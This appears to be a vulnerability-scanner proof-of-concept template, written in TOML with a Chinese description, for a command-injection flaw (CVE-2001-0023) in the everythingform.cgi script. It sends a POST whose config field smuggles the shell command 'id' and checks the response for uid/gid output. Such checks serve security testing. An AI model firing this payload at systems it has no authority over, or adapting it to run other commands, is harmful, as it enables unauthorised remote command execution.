[info]
author = "ave"
description = "检测 Leif M. Wright everythingform.cgi 2.0 config 参数任意命令执行漏洞"
id = "POC-AVE-2001-0010"
name = "Leif Wright everythingform.cgi 任意命令执行漏洞 PoC"
severity = "critical"
tags = ["ave-2001-0010"]
vuln_id = [
    "CVE-2001-0023",
    "AVE-2001-0010",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/cgi-bin/everythingform.cgi"
protocol = "http"

[poc.requests.body]
content = "config=|id||"
type = "form"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "uid=",
    "gid=",
]
